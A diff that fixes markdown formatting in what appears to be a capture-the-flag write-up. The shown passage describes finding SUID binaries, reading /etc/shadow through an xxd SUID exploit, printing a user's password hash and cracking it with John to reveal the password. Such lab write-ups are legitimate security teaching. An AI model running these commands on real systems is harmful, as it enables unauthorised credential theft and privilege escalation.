@@ -75,7 +75,8 @@ I search for SUID binaries using the command `find / -user root -perm -4000 -pri
 
 I use this exploit to read the contents of the shadow file using `/usr/bin/xxd "/etc/shadow" | xxd -r` and get the following information:
 
-```vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+```
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
 ```
 I write this to a file then use John to crack the hash `john hash.txt` which reveals the password as "beautiful1"
 
